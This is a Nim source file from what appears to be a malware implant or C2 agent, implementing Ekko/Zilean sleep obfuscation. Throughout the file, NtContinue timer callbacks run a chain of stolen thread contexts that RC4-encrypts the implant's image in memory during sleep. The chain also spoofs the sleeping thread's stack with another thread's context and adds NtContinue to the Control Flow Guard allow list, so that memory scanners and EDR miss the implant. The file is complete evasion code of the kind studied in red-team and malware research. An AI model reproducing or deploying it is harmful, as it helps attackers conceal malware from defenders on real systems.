import winim/lean
import winim/inc/tlhelp32
import os, system, strformat

import ./cfg 
import ../../common/[types, utils, crypto]

# Sleep obfuscation implementation based on Ekko, originally developed by C5pider 
# The code in this file was taken from the MalDev Academy modules 54, 56 & 59 and translated from C to Nim
# https://maldevacademy.com/new/modules/54
# https://maldevacademy.com/new/modules/56

type 
    USTRING* {.bycopy.} = object 
        Length*: DWORD 
        MaximumLength*: DWORD 
        Buffer*: PVOID

    EVENT_TYPE = enum 
        NotificationEvent, 
        SynchronizationEvent

    WAIT_CALLBACK_ROUTINE = proc(Parameter: PVOID, TimerOrWaitFired: BOOLEAN): VOID 
    PWAIT_CALLBACK_ROUTINE = ptr WAIT_CALLBACK_ROUTINE

# Required APIs (definitions taken from NtDoc)
proc RtlCreateTimerQueue*(phTimerQueueHandle: PHANDLE): NTSTATUS {.cdecl, stdcall, importc: protect("RtlCreateTimerQueue"), dynlib: protect("ntdll.dll").}
proc RtlDeleteTimerQueue(hQueue: HANDLE): NTSTATUS {.cdecl, stdcall, importc: protect("RtlDeleteTimerQueue"), dynlib: protect("ntdll.dll").}
proc NtCreateEvent*(phEvent: PHANDLE, desiredAccess: ACCESS_MASK, objectAttributes: POBJECT_ATTRIBUTES, eventType: EVENT_TYPE, initialState: BOOLEAN): NTSTATUS {.cdecl, stdcall, importc: protect("NtCreateEvent"), dynlib: protect("ntdll.dll").}
proc RtlCreateTimer(queue: HANDLE, hTimer: PHANDLE, function: FARPROC, context: PVOID, dueTime: ULONG, period: ULONG, flags: ULONG): NTSTATUS {.cdecl, stdcall, importc: protect("RtlCreateTimer"), dynlib: protect("ntdll.dll").}
proc RtlRegisterWait( hWait: PHANDLE, handle: HANDLE, function: PWAIT_CALLBACK_ROUTINE, ctx: PVOID, ms: ULONG, flags: ULONG): NTSTATUS  {.cdecl, stdcall, importc: protect("RtlRegisterWait"), dynlib: protect("ntdll.dll").}
proc NtSignalAndWaitForSingleObject(hSignal: HANDLE, hWait: HANDLE, alertable: BOOLEAN, timeout: PLARGE_INTEGER): NTSTATUS {.cdecl, stdcall, importc: protect("NtSignalAndWaitForSingleObject"), dynlib: protect("ntdll.dll").}
proc NtDuplicateObject(hSourceProcess: HANDLE, hSource: HANDLE, hTargetProcess: HANDLE, hTarget: PHANDLE, desiredAccess: ACCESS_MASK, attributes: ULONG, options: ULONG ): NTSTATUS {.cdecl, stdcall, importc: protect("NtDuplicateObject"), dynlib: protect("ntdll.dll").}
proc NtSetEvent(hEvent: HANDLE, previousState: PLONG): NTSTATUS {.cdecl, stdcall, importc: protect("NtSetEvent"), dynlib: protect("ntdll.dll").}

# Function for retrieving a random thread's thread context for stack spoofing
proc GetRandomThreadCtx(): CONTEXT = 
    
    var 
        ctx: CONTEXT
        hSnapshot: HANDLE
        thd32Entry: THREADENTRY32 
        hThread: HANDLE

    thd32Entry.dwSize = DWORD(sizeof(THREADENTRY32))

    # Create snapshot of all available threads
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
    if hSnapshot == INVALID_HANDLE_VALUE: 
        raise newException(CatchableError, $GetLastError())
    defer: CloseHandle(hSnapshot)

    if Thread32First(hSnapshot, addr thd32Entry) == FALSE: 
        raise newException(CatchableError, $GetLastError())
        
    while Thread32Next(hSnapshot, addr thd32Entry) != 0: 
        # Check if the thread belongs to the current process but is not the current thread
        if thd32Entry.th32OwnerProcessID == GetCurrentProcessId() and thd32Entry.th32ThreadID != GetCurrentThreadId(): 
            
            # Open handle to the thread
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thd32Entry.th32ThreadID)
            if hThread == 0: 
                continue 
            
            # Retrieve thread context
            ctx.ContextFlags = CONTEXT_ALL # This setting is required to be able to fill the CONTEXT structure
            if GetThreadContext(hThread, addr ctx) == 0: 
                continue

            echo fmt"[*] Using thread {thd32Entry.th32ThreadID} for stack spoofing."
            break  

    return ctx

# Ekko sleep obfuscation with stack spoofing 
proc sleepObfuscate*(sleepDelay: int, mode: SleepObfuscationMode = EKKO, spoofStack: bool = true) = 
    
    echo fmt"[*] Using {$mode} for sleep obfuscation [Stack duplication: {$spoofStack}]."

    if sleepDelay == 0: 
        return 

    var 
        status: NTSTATUS = 0
        img: USTRING = USTRING(Length: 0)
        key: USTRING = USTRING(Length: 0)
        ctx: array[10, CONTEXT]
        ctxInit: CONTEXT
        ctxBackup: CONTEXT
        ctxSpoof: CONTEXT 
        hThread: HANDLE
        hEventTimer: HANDLE
        hEventWait: HANDLE
        hEventStart: HANDLE
        hEventEnd: HANDLE
        queue: HANDLE
        timer: HANDLE 
        oldProtection: DWORD = 0
        delay: DWORD = 0
    
    try: 
        var 
            NtContinue = GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtContinue"))
            SystemFunction032 = GetProcAddress(LoadLibraryA(protect("Advapi32")), protect("SystemFunction032"))

        # Add NtContinue to the Control Flow Guard allow list to make Ekko work in processes protected by CFG
        discard evadeCFG(NtContinue)

        # Locate image base and size
        var imageBase = GetModuleHandleA(NULL)
        var imageSize = (cast[PIMAGE_NT_HEADERS](imageBase + (cast[PIMAGE_DOS_HEADER](imageBase)).e_lfanew)).OptionalHeader.SizeOfImage
        # echo fmt"[+] Image base at: 0x{cast[uint64](imageBase).toHex()} ({imageSize} bytes)"

        img.Buffer = cast[PVOID](imageBase)
        img.Length = imageSize

        # Generate random encryption key
        var keyBuffer: string = Bytes.toString(generateBytes(Key16)) 
        key.Buffer = keyBuffer.addr
        key.Length = cast[DWORD](keyBuffer.len())

        # Sleep obfuscation implementation using Windows Native API functions 
        # Create timer queue
        if mode == EKKO:
            status = RtlCreateTimerQueue(addr queue) 
            if status != STATUS_SUCCESS:
                raise newException(CatchableError, "RtlCreateTimerQueue " & $status.toHex())

        # Create events
        status = NtCreateEvent(addr hEventTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, "NtCreateEvent " & $status.toHex())

        if mode == ZILEAN:
            status = NtCreateEvent(addr hEventWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
            if status != STATUS_SUCCESS:
                raise newException(CatchableError, "NtCreateEvent " & $status.toHex())

        status = NtCreateEvent(addr hEventStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, "NtCreateEvent " & $status.toHex())

        status = NtCreateEvent(addr hEventEnd, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, "NtCreateEvent " & $status.toHex())

        if mode == EKKO: 
            # Retrieve the initial thread context
            delay += 100
            status = RtlCreateTimer(queue, addr timer, RtlCaptureContext, addr ctxInit, delay, 0, WT_EXECUTEINTIMERTHREAD)
            if status != STATUS_SUCCESS: 
                raise newException(CatchableError, "RtlCreateTimer/RtlCaptureContext " & $status.toHex())

            # Wait until RtlCaptureContext is successfully completed to prevent a race condition from forming
            delay += 100
            status = RtlCreateTimer(queue, addr timer, SetEvent, cast[PVOID](hEventTimer), delay, 0, WT_EXECUTEINTIMERTHREAD)
            if status != STATUS_SUCCESS:
                raise newException(CatchableError, "RtlCreateTimer/SetEvent " & $status.toHex())

        elif mode == ZILEAN:
            delay += 100
            status = RtlRegisterWait(addr timer, hEventWait, cast[PWAIT_CALLBACK_ROUTINE](RtlCaptureContext), addr ctxInit, delay, WT_EXECUTEONLYONCE or WT_EXECUTEINWAITTHREAD)
            if status != STATUS_SUCCESS: 
                raise newException(CatchableError, "RtlRegisterWait/RtlCaptureContext " & $status.toHex())

            delay += 100
            status = RtlRegisterWait(addr timer, hEventWait, cast[PWAIT_CALLBACK_ROUTINE](SetEvent), cast[PVOID](hEventTimer), delay, WT_EXECUTEONLYONCE or WT_EXECUTEINWAITTHREAD)
            if status != STATUS_SUCCESS:
                raise newException(CatchableError, "RtlRegisterWait/SetEvent " & $status.toHex())

        # Wait for events to finish before continuing 
        status = NtWaitForSingleObject(hEventTimer, FALSE, NULL)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, "NtWaitForSingleObject " & $status.toHex())

        if spoofStack: 
            # Stack duplication
            # Create handle to the current process
            # Retrieve a random thread context from the current process
            ctxSpoof = GetRandomThreadCtx() 
            status = NtDuplicateObject(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), addr hThread, THREAD_ALL_ACCESS, 0, 0)
            if status != STATUS_SUCCESS: 
                raise newException(CatchableError, "NtDuplicateObject " & $status.toHex())

        # Preparing the ROP chain 
        # Initially, each element in this array will have the same context as the timer's thread context
        for i in 0 ..< ctx.len(): 
            copyMem(addr ctx[i], addr ctxInit, sizeof(CONTEXT))
            dec(ctx[i].Rsp, sizeof(PVOID)) # Stack alignment, due to the RSP register being incremented by the size of a pointer
        
        var gadget = 0

        # ROP Chain
        # ctx[0] contains the call to WaitForSingleObjectEx, which waits for a signal to start and execute the rest of the chain.
        ctx[gadget].Rip = cast[DWORD64](NtWaitForSingleObject)
        ctx[gadget].Rcx = cast[DWORD64](hEventStart)
        ctx[gadget].Rdx = cast[DWORD64](FALSE)
        ctx[gadget].R8  = cast[DWORD64](NULL)
        inc gadget

        # ctx[1] contains the call to VirtualProtect, which changes the protection of the payload image memory to [RW-]
        ctx[gadget].Rip = cast[DWORD64](VirtualProtect)
        ctx[gadget].Rcx = cast[DWORD64](imageBase)
        ctx[gadget].Rdx = cast[DWORD64](imageSize)
        ctx[gadget].R8  = cast[DWORD64](PAGE_READWRITE)
        ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
        inc gadget

        # ctx[2] contains the call to SystemFunction032, which performs the actual payload memory obfuscation using RC4.
        ctx[gadget].Rip = cast[DWORD64](SystemFunction032)
        ctx[gadget].Rcx = cast[DWORD64](addr img)
        ctx[gadget].Rdx = cast[DWORD64](addr key)
        inc gadget

        if spoofStack:
            # ctx[3] contains the call to GetThreadContext, which retrieves the payload's main thread context and saves it into the CtxBackup variable for later restoration.
            ctxBackup.ContextFlags = CONTEXT_ALL
            ctx[gadget].Rip = cast[DWORD64](GetThreadContext)
            ctx[gadget].Rcx = cast[DWORD64](hThread)
            ctx[gadget].Rdx = cast[DWORD64](addr ctxBackup)
            inc gadget

            # ctx[4] contains the call to SetThreadContext that will spoof the payload thread by setting the thread context with the stolen context.
            ctx[gadget].Rip = cast[DWORD64](SetThreadContext)
            ctx[gadget].Rcx = cast[DWORD64](hThread)
            ctx[gadget].Rdx = cast[DWORD64](addr ctxSpoof)
            inc gadget

        # ctx[5] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached. 
        ctx[gadget].Rip = cast[DWORD64](WaitForSingleObjectEx)
        ctx[gadget].Rcx = cast[DWORD64](cast[HANDLE](-1))
        ctx[gadget].Rdx = cast[DWORD64](cast[DWORD](sleepDelay))
        ctx[gadget].R8  = cast[DWORD64](FALSE)
        inc gadget
        
        # ctx[6] contains the call to SystemFunction032 to decrypt the previously encrypted payload memory
        ctx[gadget].Rip = cast[DWORD64](SystemFunction032)
        ctx[gadget].Rcx = cast[DWORD64](addr img)
        ctx[gadget].Rdx = cast[DWORD64](addr key)
        inc gadget

        if spoofStack: 
            # ctx[7] calls SetThreadContext to restore the original thread context from the previously saved CtxBackup.
            ctx[gadget].Rip = cast[DWORD64](SetThreadContext)
            ctx[gadget].Rcx = cast[DWORD64](hThread)
            ctx[gadget].Rdx = cast[DWORD64](addr ctxBackup)
            inc gadget

        # ctx[8] contains the call to VirtualProtect to change the payload memory back to [R-X]
        ctx[gadget].Rip = cast[DWORD64](VirtualProtect)
        ctx[gadget].Rcx = cast[DWORD64](imageBase)
        ctx[gadget].Rdx = cast[DWORD64](imageSize)
        ctx[gadget].R8  = cast[DWORD64](PAGE_EXECUTE_READWRITE)
        ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
        inc gadget
        
        # ctx[9] contains the call to the SetEvent WinAPI that will set hEventEnd event object in a signaled state. This with signal that the obfuscation chain is complete
        ctx[gadget].Rip = cast[DWORD64](NtSetEvent)
        ctx[gadget].Rcx = cast[DWORD64](hEventEnd)
        ctx[gadget].Rdx = cast[DWORD64](NULL)

        # Executing timers
        for i in 0 .. gadget: 
            delay += 100

            if mode == EKKO:
                status = RtlCreateTimer(queue, addr timer, NtContinue, addr ctx[i], delay, 0, WT_EXECUTEINTIMERTHREAD)
                if status != STATUS_SUCCESS: 
                    raise newException(CatchableError, "RtlCreateTimer/NtContinue " & $status.toHex())
            
            elif mode == ZILEAN: 
                status = RtlRegisterWait(addr timer, hEventWait, cast[PWAIT_CALLBACK_ROUTINE](NtContinue), addr ctx[i], delay, WT_EXECUTEONLYONCE or WT_EXECUTEINWAITTHREAD)
                if status != STATUS_SUCCESS: 
                    raise newException(CatchableError, "RtlRegisterWait/NtContinue " & $status.toHex())

        echo protect("[*] Sleep obfuscation start.")

        status = NtSignalAndWaitForSingleObject(hEventStart, hEventEnd, FALSE, NULL)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, "NtSignalAndWaitForSingleObject " & $status.toHex())

        echo protect("[*] Sleep obfuscation end.")

    except CatchableError as err: 
        sleep(sleepDelay)
        echo protect("[-] "), err.msg
        
    finally:        
        if hEventTimer != 0: 
            CloseHandle(hEventTimer)
            hEventTimer = 0
        if hEventWait != 0: 
            CloseHandle(hEventWait)
            hEventWait = 0
        if hEventStart != 0: 
            CloseHandle(hEventStart)
            hEventStart = 0
        if hEventEnd != 0: 
            CloseHandle(hEventEnd)
            hEventEnd = 0
        if hThread != 0: 
            CloseHandle(hThread)
            hThread = 0
        if queue != 0: 
            discard RtlDeleteTimerQueue(queue) 